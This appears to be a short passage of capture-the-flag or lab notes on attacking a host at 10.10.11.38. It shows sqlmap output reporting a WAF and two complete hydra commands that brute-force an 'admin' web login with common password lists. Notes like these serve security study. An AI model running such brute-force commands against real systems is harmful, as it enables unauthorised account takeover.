
## ATTEMPTED ATTACKS

- Attempted a simple **sql injection** attack. Perhaps i caused the page to crash because afterwards it was too unstable.

```bash
[14:20:34] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests

[14:24:14] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] 
```

- One of the basic users that exists is **admin**. Attempted a basic **password attack**.

```bash
$ hydra -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt 10.10.11.38 -s 5000  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

$ hydra -l admin -P ./Downloads/rockyou.txt 10.10.11.38 -s 5000  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

```
